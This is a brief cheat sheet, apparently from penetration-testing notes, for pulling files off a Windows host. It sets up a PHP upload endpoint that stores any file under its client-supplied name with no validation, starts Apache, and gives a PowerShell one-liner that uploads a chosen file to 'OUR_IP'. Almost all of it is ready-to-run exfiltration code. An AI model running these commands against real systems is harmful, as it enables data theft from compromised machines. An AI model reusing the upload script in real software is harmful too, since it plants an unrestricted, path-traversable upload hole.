# PHP Script

### 1) Create upload.php

    <?php
      $uploaddir = '/var/www/uploads/';
    
      $uploadfile = $uploaddir . $_FILES['file']['name'];
    
      move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
    ?>

### 2) Move the file to /var/www/uploads

    chmod +x upload.php

    sudo mkdir /var/www/uploads

    mv upload.php /var/www/uploads

### 3) Start Apache server

    service apache2 start

    ps -ef | grep apache

### 4) Send files from Windows

    powershell (New-Object System.Net.WebClient).UploadFile('http://OUR_IP/upload.php', 'FILE_TO_TRANSFER')

### 5) Stop apache server

    service apache2 stop
